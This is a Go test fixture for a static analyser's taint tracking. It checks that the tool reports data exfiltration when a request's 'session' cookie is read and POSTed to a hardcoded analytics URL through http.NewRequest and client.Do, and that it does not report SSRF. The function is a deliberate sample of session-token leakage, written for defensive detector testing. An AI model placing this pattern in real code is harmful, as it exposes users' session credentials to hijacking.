// DATA_EXFIL fixture for the two-step `http.NewRequest` → `client.Do`
// idiom.  `http.NewRequest` is modeled as a body propagator (default
// arg → return propagation lifts body taint onto the returned
// `*http.Request`); the outbound network call happens at
// `http.DefaultClient.Do`, where the DATA_EXFIL gate fires on the
// request argument.
//
// SSRF must NOT fire (URL is hardcoded at NewRequest's URL position) and
// the cookie-derived body must surface DATA_EXFIL at the Do call.
//
// Driven by `data_exfil_go_integration_tests.rs`.
package fixture

import (
	"net/http"
	"strings"
)

func leakViaNewRequest(r *http.Request) {
	c, _ := r.Cookie("session")
	body := strings.NewReader(c.Value)
	req, _ := http.NewRequest("POST", "https://analytics.internal/track", body)
	http.DefaultClient.Do(req)
}
